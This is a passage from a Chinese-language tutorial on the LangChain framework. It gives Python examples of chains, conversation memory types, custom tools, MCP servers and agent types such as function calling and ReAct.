<span class="hljs-attr">response</span> = chain.invoke({<span class="hljs-string">"name"</span>: <span class="hljs-string">"RiskHelper"</span>, <span class="hljs-string">"question"</span>: <span class="hljs-string">"什么是反洗钱？"</span>})
print(response)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4b399e3b65d4122af876c81456297c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=h7mw8h6Ml3z20fguhbxMMp4hQp8%3D" alt="" loading="lazy"/></p>
<p>注意：上述是LLMChain的使用，但是LLMChain在0.1.17版本已经被标记为过时，且在1.0版本后会被移除。</p>
<p>2、SequentialChain（顺序链，已过时）：通过将多个Chain串起来，实现分步任务处理，前一个链的输出作为后一个链的输入，适用于需要分步处理的任务，如先总结再翻译。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">chatprompt_template1</span> = ChatPromptTemplate([
SystemMessagePromptTemplate.from_template(<span class="hljs-string">"你是一个{name}领域的专家"</span>),
HumanMessagePromptTemplate.from_template(<span class="hljs-string">"请详细讲一下什么是{title}？"</span>)
])
<span class="hljs-attr">chain1</span> = LLMChain(llm=chat_model, prompt=chatprompt_template1, output_key=<span class="hljs-string">"text"</span>)
<span class="hljs-attr">chatprompt_template2</span> = ChatPromptTemplate([
SystemMessagePromptTemplate.from_template(<span class="hljs-string">"你是一个文章总结专家"</span>),
HumanMessagePromptTemplate.from_template(<span class="hljs-string">"请帮我用一句话概括一下{text}"</span>)
])
<span class="hljs-attr">chain2</span> = LLMChain(llm=chat_model, prompt=chatprompt_template2, output_key=<span class="hljs-string">"translation"</span>)
<span class="hljs-comment"># 构建顺序链</span>
<span class="hljs-attr">chain</span> = SequentialChain(
<span class="hljs-attr">chains</span>=[chain1, chain2],
<span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"name"</span>, <span class="hljs-string">"title"</span>],
<span class="hljs-attr">output_variables</span>=[<span class="hljs-string">"translation"</span>]
)
<span class="hljs-attr">response</span> = chain.invoke({<span class="hljs-string">"name"</span>: <span class="hljs-string">"反洗钱"</span>, <span class="hljs-string">"title"</span>: <span class="hljs-string">"EDD"</span>})
print(response)
</code></pre>
<p>SequentialChain也在0.1.17版本被标记为过时，且在1.0版本后会被移除</p>
<p>3、LCEL（LangChain Expression Language，推荐使用的方式）：是 LangChain 框架中用于构建和组合Chain的一种声明式、模块化且高效的语言。类似于Linux中的管道符 | ，将提示模板、语言模型、输出解析器等组件灵活地组合成可执行的工作流。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">json_parser</span> = JsonOutputParser()
<span class="hljs-attr">prompt_template</span> = PromptTemplate(
<span class="hljs-attr">template</span>=<span class="hljs-string">"用简单的一句话描述一下什么是{name}？请按照以下格式输出：{format_instructions}"</span>,
<span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"name"</span>],
<span class="hljs-comment"># 告诉大模型，按照json格式输出</span>
<span class="hljs-attr">partial_variables</span>={<span class="hljs-string">"format_instructions"</span>: json_parser.get_format_instructions()}
)
<span class="hljs-comment"># 使用管道符构建chain</span>
<span class="hljs-attr">chain</span> = prompt_template | chat_model | json_parser
<span class="hljs-attr">response</span> = chain.invoke({<span class="hljs-string">"name"</span>: <span class="hljs-string">"反洗钱"</span>})
print(response)
</code></pre>
<p>除了上述的chain之外，LangChain还提供了以下类型的chain。</p>
<ol>
<li>LLMMathChain（数学链）：将用户问题转换为数学问题，然后再转换为可以使用Python的numexpr库执行的表达式。</li>
<li>RouterChain（路由链）：根据输入内容分析并决定调用哪个专用的子链处理。可以自动分析用户的需求，然后路由到最适合的链中执行，并返回最终结果。</li>
<li>StuffDocumentsChain（文档链）：将多个文档内容合并 （“填充”或“塞入”）到单个提示词中，然后调用大模型进行处理。</li>
</ol>
<h2 data-id="heading-4">05</h2>
<p>LangChain核心组件之Memory</p>
<p>5.1 Memory（记忆）概述</p>
<p>我们知道，大模型本身都不会记忆任何上下文信息，那为什么我们常用的大模型应用能够清楚的知道我们之前的对话内容（与AI应用可以进行多轮对话）？并且有一定的记忆能力，这就需要额外的模块去保存我们和大模型进行对话的上下文信息，然后在下一次对话前将历史的记录全部发送给大模型，提供给大模型参考以便能够更准确的回答当前的提问。</p>
<p>在LangChain中，这个用于存储用户和模型交互的历史信息的组件叫Memory，它能够让应用记住用户之前说了什么，从而实现对话的上下文感知能力，为构建真正智能和上下文感知的链式对话系统提供了基础。</p>
<p>5.2 Memory的原理</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7617be5f5d0949299701f2bfae7a7bc4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=SpJQ73NJxbi6Jk9%2F5trZca7zpiE%3D" alt="" loading="lazy"/></p>
<p>STEP1：用户输入问题</p>
<p>STEP2：从Memory中读取历史消息</p>
<p>STEP3：构建新的提示词，包含历史消息和当前的提问</p>
<p>STEP4：发送给大模型处理</p>
<p>STEP5：解析大模型输出，并返回用户</p>
<p>STEP6：将历史对话和当前对话一起保存在Memory中，以便下一次使用</p>
<p>5.3 Memory组件使用</p>
<p>LangChain中提供了一系列的Memory用于保存历史上下文，不同的Memory保存的内容也不一样，常用的使用方式如下：</p>
<p>1、ChatMessageHistory：用于存储和管理对话消息的基础类，它直接操作消息对象（如HumanMessage, AIMessage 等），是其它记忆组件的底层存储工具。特点：轻量、无需额外依赖、数据不会持久化（程序重启后丢失）。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建Memory</span>
<span class="hljs-built_in">history</span> = ChatMessageHistory()
<span class="hljs-comment"># 添加用户消息</span>
history.add_user_message(<span class="hljs-string">"你好，我是RiskHelper"</span>)
<span class="hljs-comment"># 添加AI消息</span>
history.add_ai_message(<span class="hljs-string">"我是DeepSeek大模型"</span>)
<span class="hljs-comment"># 添加用户消息</span>
history.add_user_message(<span class="hljs-string">"我是谁？"</span>)
<span class="hljs-comment"># 通过将history.messages 直接传入大模型，大模型能够看到完整的对话上下文，从而实现有记忆的连续对话</span>
response = chat_model.invoke(history.messages)
<span class="hljs-built_in">print</span>(response.content)
</code></pre>
<p>2、ConversationBufferMemory：是LangChain中最基础、最直接的记忆组件，按顺序完整地记录用户与AI之间的每一轮对话，并将这些历史信息提供给模型，以实现连贯的多轮对话。他能保存全部的上下文信息，对话连贯性最强，但是会消耗大量的Token，且随着对话的进行，会占用大量的内存资源。它适用于短对话，需要保存完整的上下文信息的复杂任务。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">prompt_template</span> = PromptTemplate.from_template(
"历史对话: {history}，当前问题: {input}"
)
<span class="hljs-attr">memory</span> = ConversationBufferMemory(memory_key=<span class="hljs-string">"history"</span>)
<span class="hljs-attr">chain</span> = LLMChain(llm=chat_model, prompt=prompt_template, memory=memory)
<span class="hljs-attr">response</span> = chain.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"用简单一句话描述什么是LangChain？"</span>})
print(response)
print("==============================================================")
<span class="hljs-attr">response</span> = chain.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"如何使用它？"</span>})
print(response)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c623fda148f47a8b8871cecae6c7c59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=OLbx%2FLCSVEP3SnJwNYrnubFzrx4%3D" alt="" loading="lazy"/></p>
<p>3、ConversationBufferWindowMemory：只保留最近 K 轮对话，解决ConversationBufferMemory占用内存多、tokken消耗大问题，平衡连贯性与资源消耗。随之带来的问题是会丢失早期上下文，不适合复杂场景。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">prompt_template</span> = PromptTemplate.from_template(
"历史对话: {history}，当前问题: {input}"
)
<span class="hljs-attr">memory</span> = ConversationBufferWindowMemory(memory_key=<span class="hljs-string">"history"</span>, k=<span class="hljs-number">10</span>) <span class="hljs-comment"># k表示保留的对话轮数</span>
<span class="hljs-attr">chain</span> = LLMChain(llm=chat_model, prompt=prompt_template, memory=memory)
<span class="hljs-attr">response</span> = chain.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"用简单一句话描述什么是LangChain？"</span>})
print(response)
</code></pre>
<p>4、ConversationSummaryMemory：它是 LangChain 中一种智能的记忆管理组件，它通过自动生成对话摘要来解决长对话上下文管理的问题。与简单截断历史的记忆类型不同，它使用大模型来提炼对话精髓，实现长期记忆。核心思想是：不存储原始对话记录，而是存储对话的智能摘要。当新的对话发生时，系统会将现有摘要与最新对话结合，生成更新的摘要。</p>
<pre><code class="hljs language-scss" lang="scss">history = <span class="hljs-built_in">ChatMessageHistory</span>()
history<span class="hljs-selector-class">.add_ai_message</span>("你好，我是RiskHelper")
history<span class="hljs-selector-class">.add_user_message</span>("你好，什么是反洗钱？")
history<span class="hljs-selector-class">.add_user_message</span>("你好，什么是风控”")
memory = ConversationSummaryMemory<span class="hljs-selector-class">.from_messages</span>(llm=chat_model,chat_memory=history)
<span class="hljs-built_in">print</span>(memory.load_memory_variables({}))
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06d515ef713944d6abc58f708354930a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=7kzvb71l6AkWAAq5ltwvKCRCC6s%3D" alt="" loading="lazy"/></p>
<p>5、ConversationSummaryBufferMemory：是LangChain中一种非常实用的混合型记忆组件，它巧妙地将对话摘要与原始对话缓冲区结合起来，旨在解决长对话场景下既要保持上下文连贯性又要控制资源消耗的核心矛盾。其核心创新在于采用了分层记忆管理策略，在对话连贯性和资源消耗之间找到平衡点。</p>
<pre><code class="hljs language-css" lang="css">memory = ConversationSummaryBufferMemory(
llm=chat_model,
max_token_limit=<span class="hljs-number">100</span>,
return_messages=True
)
memory<span class="hljs-selector-class">.save_context</span>({"<span class="hljs-selector-tag">input</span>": <span class="hljs-string">"你好，我是RiskHelper"</span>},{"output": <span class="hljs-string">"你好，我是DeepSeek大模型"</span>})
memory<span class="hljs-selector-class">.save_context</span>({"<span class="hljs-selector-tag">input</span>": <span class="hljs-string">"你好，什么是反洗钱？"</span>},{"output": <span class="hljs-string">"反洗钱是指对洗钱犯罪的预防和打击措施"</span>})
memory<span class="hljs-selector-class">.save_context</span>({"<span class="hljs-selector-tag">input</span>": <span class="hljs-string">"你好，什么是风控？"</span>},{"output": <span class="hljs-string">"风控是指对风险的控制措施"</span>})
memory<span class="hljs-selector-class">.save_context</span>({"<span class="hljs-selector-tag">input</span>": <span class="hljs-string">"你好，EDD？"</span>},{"output": <span class="hljs-string">"EDD是指对客户身份的识别措施"</span>})
print(memory<span class="hljs-selector-class">.load_memory_variables</span>({}))
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e538efedd1f4c69a834193d874e96e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=y3q1wFM394%2F0euQqSTcc6DlfO9Y%3D" alt="" loading="lazy"/></p>
<p>注意： 有些模型（如Deepseek）没提供get_num_tokens_from_messages（计算token）函数，执行时会报错，解决办法继承ChatOpenAI，然后实现get_num_tokens_from_messages函数：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment">#创建一个继承于ChatOpenAI的类，并实现get_num_tokens_from_messages方法</span>
class DeepSeekChatOpenAI(ChatOpenAI):
def get_num_tokens_from_messages(self, messages: List<span class="hljs-section">[BaseMessage]</span>) -&gt; int:
<span class="hljs-comment">#实现get_num_tokens_from_messages方法，返回消息的token数量</span>
<span class="hljs-attr">total_tokens</span> = <span class="hljs-number">100</span> <span class="hljs-comment"># 自定义函数</span>
return total_tokens<span class="hljs-comment">;</span>
<span class="hljs-attr">chat_model</span> = DeepSeekChatOpenAI(
<span class="hljs-attr">model_name</span>=model_name,
<span class="hljs-attr">base_url</span>=base_url,
<span class="hljs-attr">api_key</span>=api_key
)
</code></pre>
<p>除了上述介绍的Memory之外，LangChain还提供了一下其他的Memory：</p>
<p>6、ConversationEntityMemory：一种基于实体的对话记忆机制，它能够智能地识别、存储和利用对话中出现的实体信息（如人名、地点、产品等）及其属性/关系，并结构化存储，使 AI 具备更强的上下文理解和记忆能力，能够解决信息过载问题。</p>
<p>7、ConversationKGMemory： 一种基于知识图谱的先进记忆组件，它将对话内容组织成结构化的知识图谱，实现更加语义化和关联性的记忆管理。</p>
<p>8、VectorStoreRetrieverMemory：一种基于向量数据库的先进记忆组件，它利用语义相似度检索技术，从大量历史对话中智能召回与当前对话最相关的记忆片段。</p>
<h2 data-id="heading-5">06</h2>
<p>LangChain核心组件之Tools</p>
<p>6.1 Tools概述</p>
<p>Tools是大模型、智能体（Agent）与外部世界进行交互的核心组件，本质上是封装了一些特定功能的可调用的函数（数学计算、获取时间、搜索等）， 允许大模型与外部系统、API、数据源和工具进行交互，其核心价值在于极大地扩展了 LLM 应用的能力边界（动作）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54bd242102834afa8365732fe49c0422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=c6SvaHhrgY6o96rLPivvR371xfA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48e6f8fe066d45bab191e4cd013c4462~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=H%2BuS3ATtyCj3BmSMi0W4DWqqsik%3D" alt="" loading="lazy"/></p>
<p>6.2 Tools组件使用</p>
<p>Tool 通常包含如下几个要素：      </p>
<ol>
<li>工具名称 - 工具的唯一标识，通常是函数名，也可以自定义</li>
<li>工具描述 - 工具的功能说明，应当清晰准确的描述工具的作用、使用场景等，直接决定Agent是否会使用这个工具</li>
<li>参数定义 - 每个参数的名称、类型、描述、是否必需</li>
<li>返回类型 - 工具返回的数据类型</li>
<li>执行逻辑 - 实际的代码实现</li>
</ol>
<p>使用流程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f4899e425b64157a10feda67e29d92c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=ytt0DGGGVkBt5rC0ZDmdWnab16w%3D" alt="" loading="lazy"/></p>
<p>STEP1-工具创建：使用@tool注解创建工具。</p>
<p>STEP2-工具绑定：将创建的工具绑定到Agent上（可以绑定多个），包括工具的名称、描述、参数、返回等，让Agent知道有哪些工具可用。</p>
<p>STEP3-工具调用：模型返回调用具体的工具后，Agent根据该工具的参数描述构造参数，并发起调用</p>
<p>STEP4-工具执行：执行工具的具体逻辑，并返回结果。</p>
<p>两种自定义工具的方式：</p>
<p>方式一：@tool装饰器</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@tool(<span class="hljs-params">
<span class="hljs-comment"># 指定工具的名称，这是 Agent 识别和调用工具时使用的标识符。</span>
<span class="hljs-comment"># 默认值：如果不指定，默认使用函数名作为工具名称。</span>
name_or_callable=<span class="hljs-string">"multiply"</span>,  <span class="hljs-comment">#</span>
<span class="hljs-comment"># 用于告诉 Agent 这个工具的功能和用途。这对 Agent 选择合适的工具至关重要。</span>
<span class="hljs-comment"># 默认值：如果不指定，会尝试使用函数的文档字符串（docstring）作为描述。如果文档字符串也没有，则为空字符串。</span>
description=<span class="hljs-string">"Multiply two numbers"</span>,
<span class="hljs-comment"># 控制工具执行结果的返回方式</span>
<span class="hljs-comment"># True：工具的输出直接作为 Agent 的最终回答返回给用户</span>
<span class="hljs-comment"># False：工具的输出会传递给 Agent，由 Agent 进一步处理或与其他信息结合后再回答</span>
return_direct=<span class="hljs-literal">True</span>
</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
<span class="hljs-string">"""Multiply a and b."""</span>  <span class="hljs-comment"># 如果不指定description，这会成为工具描述</span>
<span class="hljs-keyword">return</span> a * b
response = multiply.invoke({<span class="hljs-string">"a"</span>: <span class="hljs-number">2</span>, <span class="hljs-string">"b"</span>: <span class="hljs-number">3</span>})
<span class="hljs-built_in">print</span>(response)
</code></pre>
<p>方式二：StructuredTool的from_function()</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">multiply</span> = StructuredTool.from_function(
<span class="hljs-comment"># 绑定函数</span>
<span class="hljs-attr">func</span>=multiply,
<span class="hljs-comment"># 指定工具的名称，这是 Agent 识别和调用工具时使用的标识符。</span>
<span class="hljs-attr">name</span>=<span class="hljs-string">"multiply"</span>,
<span class="hljs-comment"># 用于告诉 Agent 这个工具的功能和用途。这对 Agent 选择合适的工具至关重要。</span>
<span class="hljs-attr">description</span>=<span class="hljs-string">"Multiply two numbers"</span>
)
<span class="hljs-attr">response</span> = multiply.invoke({<span class="hljs-string">"a"</span>: <span class="hljs-number">2</span>, <span class="hljs-string">"b"</span>: <span class="hljs-number">3</span>})
print(response)
</code></pre>
<p>结合大模型使用：</p>
<p>注意：tool一般与agent一起配合使用，agent在下一章详细介绍</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 将函数封装为LangChain工具对象</span>
<span class="hljs-attr">stock_tool</span> = Tool(
<span class="hljs-attr">name</span>=<span class="hljs-string">"getStockPrice"</span>,  <span class="hljs-comment"># 工具名称（模型将使用此名称调用工具）</span>
<span class="hljs-attr">func</span>=getStockPrice,  <span class="hljs-comment"># 工具函数</span>
<span class="hljs-attr">description</span>=<span class="hljs-string">"用于查询公司股票价格。输入应该是公司名称（如：腾讯）"</span>
<span class="hljs-comment"># 工具描述（模型根据此决定是否调用）</span>
)
<span class="hljs-comment"># 创建工具列表（Agent可以使用的所有工具）</span>
<span class="hljs-attr">tools</span> = [stock_tool]
<span class="hljs-comment"># 将LangChain工具转换为OpenAI函数调用格式</span>
<span class="hljs-attr">functools</span> = [convert_to_openai_tool(tool) for tool in tools]
<span class="hljs-comment"># 从LangChain Hub加载预定义的提示模板</span>
<span class="hljs-comment"># 'hwchase17/structured-chat-agent'是一个专门为结构化聊天Agent设计的提示模板</span>
<span class="hljs-attr">prompt</span> = hub.pull(<span class="hljs-string">'hwchase17/structured-chat-agent'</span>)
<span class="hljs-comment"># 创建结构化聊天Agent，# 参数：模型对象、工具列表、提示模板</span>
<span class="hljs-attr">agent</span> = create_structured_chat_agent(chat_model, tools, prompt)
<span class="hljs-comment"># 创建Agent执行器</span>
<span class="hljs-attr">agent_executor</span> = AgentExecutor(
<span class="hljs-attr">agent</span>=agent,                <span class="hljs-comment"># 配置好的Agent</span>
<span class="hljs-attr">tools</span>=tools,                <span class="hljs-comment"># Agent可用的工具列表</span>
<span class="hljs-attr">verbose</span>=<span class="hljs-literal">True</span>,               <span class="hljs-comment"># 开启详细日志（显示Agent思考过程）</span>
<span class="hljs-attr">handle_parsing_errors</span>=<span class="hljs-literal">True</span>  <span class="hljs-comment"># 处理解析错误（防止因格式问题崩溃）</span>
)
<span class="hljs-comment"># 执行Agent查询</span>
<span class="hljs-attr">response</span> = agent_executor.invoke({<span class="hljs-string">"input"</span>: <span class="hljs-string">"查询腾讯当日的股票价格"</span>})
print(response)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48993b9493184853a1a559871d180ed8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=GgkfXiKZItmWg2nGvq6bd4Q%2FmaQ%3D" alt="" loading="lazy"/></p>
<p>注意：实际使用过程中发现，有时候并没有调用自定义的工具，可能原因是：</p>
<p>1、大模型认为这个计算太简单（1+1），无需调用工具。</p>
<p>2、工具的描述不清楚，大模型无法推断出使用这个工具。</p>
<p>3、有些模型对于工具调用支持度不高，如DeepSeek-R1。</p>
<p>具体可通过修改工具描述、提示词或换一个模型等引导模型决定调用自定义工具。</p>
<p>6.3 MCP Server</p>
<p>Agent tools可以看做是实现在AI Agent应用中的一系列函数，但是很多Tool 的功能比较通用，如浏览网页，发送消息，天气查询等，所以将通用的工具封装成一个单独的服务，就可以供不同的Agent使用了，这个单独的服务叫MCP Server，其中MCP是一个通讯协议，用来规范Agent 和MCP Server之间是怎么交互的，如工具的功能，描述，参数等。MCP Server可以与Agent部署在同一台机器上通过标准输入输出通讯，也可以部署在网络上通过http协议通讯。虽然MCP是为了大模型而制定的标准，但实际上MCP本身和大模型没有关系，它并不关心Agent使用哪个模型，MCP只负责帮Agent管理工具、资源和提示词。</p>
<p>LangChain中的Tool 和 MCP Server比较：</p>













































<table><thead><tr><th/><th/><th/></tr></thead><tbody><tr><td>对比维度</td><td>内置Tools</td><td>MCP Server</td></tr><tr><td>部署位置</td><td>Agent 内部（同一进程）</td><td>独立服务（独立进程/网络）</td></tr><tr><td>代码耦合</td><td>紧耦合（直接引用）</td><td>松耦合（协议通信）</td></tr><tr><td>复用性</td><td>仅当前 Agent 可用</td><td>多个 Agent 可共享</td></tr><tr><td>更新维护</td><td>修改需重新编译 Agent</td><td>修改需重新编译 Agent 独立更新</td></tr><tr><td>性能</td><td>本地调用，极快</td><td>需要网络/IPC通信</td></tr><tr><td>适用场景</td><td>简单、专用工具</td><td>通用、复杂工具</td></tr></tbody></table>
<h2 data-id="heading-6">07</h2>
<p>LangChain核心组件之Agent</p>
<p>7.1 Agent（智能体）概述</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b36acdb0266d49b68e1df1d0e830353e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=CJxneKeigb%2BFkNl1U8oLldk7JvE%3D" alt="" loading="lazy"/></p>
<p>Agent（智能体）是一个通过动态协调大模型（LLM）和 工具（Tools）来完成复杂任务的智能系统（思考、分析、拆解任务、逐步实现）。它让大模型充当"决策大脑"，根据用户输入自主选择和执行工具（如搜索、计算、数据库查询等），最终生成精准的响应。2025年也被称为Agent元年，标志着人工智能正式从“思考与对话” 转向 “自主决策与行动”。</p>
<p>一个Agent应该具备以下核心能力：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31f2035b31d649d5a465d9f65ccf4279~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=jMSbJ3I1mqxa9SxJI7yxGRhutdg%3D" alt="" loading="lazy"/></p>
<ol>
<li>大模型（LLM）：作为大脑，提供推理、知识理解和逻辑判断能力。</li>
<li>记忆（Memory）：用于保持Agent的上下文信息，具备短期记忆（上下文）和长期记忆（向量存储），支持快速知识检索。使交互具有连续性。</li>
<li>工具（Tools）：扩展Agent的能力边界，通过调用外部工具（搜索、数据库等）Agent可以获取实时信息，弥补自身的功能局限性。</li>
<li>规划（Planning）：将具体的任务分解，并具备反思和调整能力，当效果不符合预期时，能够重新规划方案并执行，确保目标最终实现。</li>
<li>行动（Action）：实际执行决策的能力。比如：检索、推理、编程</li>
<li>协作（cooperation）：单一的Agent功能通常是有限的，而复杂问题往往需要不同的专业知识的Agent协同解决，不同Agent之间通过A2A协议交互。</li>
</ol>
<p>通用人工智能（AGI）将是AI的终极形态（这天是否会到来？不止是技术的突破，还有伦理、法律、社会认知等）。同样，构建智能体（Agent）则是AI工程应用当下的“终极形态”。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c961da80edd24134822e01b53915f83d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=YtaQ2gf6yJmc3QcKJ77E4QmqmJA%3D" alt="" loading="lazy"/></p>
<p>7.2 Agent Types（运行模式）</p>
<p>在 LangChain 中，Agent是一种由大模型驱动的组件，能够根据用户的输入动态决定执行哪些操作（如调用工具、访问数据等）。不同的 Agent 类型对应不同的决策逻辑和策略，适用于不同的任务场景。</p>
<p>1、Function Calling：是让LLM学会“使用工具”。预先定义好一系列函数（如get_weather， search_web），并明确描述它们的功能和参数。当用户提问时，将用户提问以及工具信息（工具描述、参数等关键信息）一起发送给大模型，大模型不直接生成答案，而是判断是否需要调用这些函数，以及如何调用，并将函数参数，函数名等信息以结构化的格式返回（如JSON格式）。</p>
<ol>
<li>关键点：LLM本身不执行函数代码，它只负责规划。实际执行由Agent完成 。</li>
<li>应用场景：适合用于获取实时数据（天气、股价）、查询数据库、执行计算或调用任何外部API等</li>
</ol>

<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
OpenAI函数调用Agent
特点：1、使用OpenAI的函数调用功能，支持结构化工具调用 2、性能最佳，响应速度快，工具调用准确性高 3、支持并行工具调用，可同时执行多个工具 4、原生支持JSON格式的参数传递
适用场景：1、需要高精度工具调用的应用 2、对响应速度有要求的生产环境 3、需要复杂参数传递的工具集成 4、推荐作为首选Agent类型
"""</span>
AgentType.OPENAI_FUNCTIONS
<span class="hljs-string">"""
OpenAI多函数调用Agent - 高级功能
特点：1、支持复杂的多步骤工具调用链 2、能够处理工具间的依赖关系 3、支持条件分支和循环调用 4、具备更强的推理和规划能力
适用场景： 1、需要多步骤复杂任务处理 2、工具间存在依赖关系的场景 3、需要动态决策和分支处理 4、复杂的业务流程自动化
"""</span>
AgentType.OPENAIMULTI_FUNCTIONS
</code></pre>
<p>2、ReAct模式（思考与行动）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb25e816e4934bec913253a2573fae9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=6%2FV9HofZx1MCty%2BMatuy2vNcv4s%3D" alt="" loading="lazy"/></p>
<p>将复杂任务拆解成，Thought (推理) → Action (行动，即调用工具) → Observation (观察结果) → ... → Final Answer（最终答案）的循环步骤：</p>
<ol>
<li>Thought（思考）：大模型首先会分析当前情况，并思考下一步应该做什么以及为什么这么做。</li>
<li>Action（行动）：根据思考的结果，判断是否需要调用工具，以及调用哪个工具，并生成相应的调用参数，发起工具调用。</li>
<li>Observation（观察）：查看工具执行的结果，判断是否成功等。如调用写文件工具，会判断文件是否写入成功。</li>
<li>Final Answer（最终答案）：如果任务已经成功或达到执行次数，则会生成最终答案，否则继续进行“思考-行动-观察”循环步骤。</li>
</ol>
<p>ReAct的工作原理：大模型本身不具备此流程（Thought-Action-Observation），实际是根据预先设定好的系统提示词来执行上述步骤的，如下是一个ReAct的系统提示词（hwchase17/react）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df7184e8607941698cadfe6d713084af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=6uLxEotGXJ2d0pX%2F62HCCZFr2nU%3D" alt="" loading="lazy"/></p>
<p>LangChain中ReAct的类型：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
零样本ReAct描述Agent
特点：1、基于ReAct（Reasoning + Acting）模式 2、通过"思考-行动-观察"的循环进行推理 3、不需要示例，完全依赖工具描述 4、具有良好的可解释性和透明度
适用场景：1、需要清晰推理过程的应用 2、工具描述详细且准确的场景 3、对可解释性有要求的业务场景 4、适合调试和问题排查
"""</span>
AgentType.ZERO_SHOT_REACT_DESCRIPTION
<span class="hljs-string">"""
结构化聊天零样本ReAct Agent
特点：1、结合了结构化输出和ReAct推理模式 2、支持更复杂的工具参数传递 3、具备更好的多轮对话能力 4、输出格式更加规范和可解析
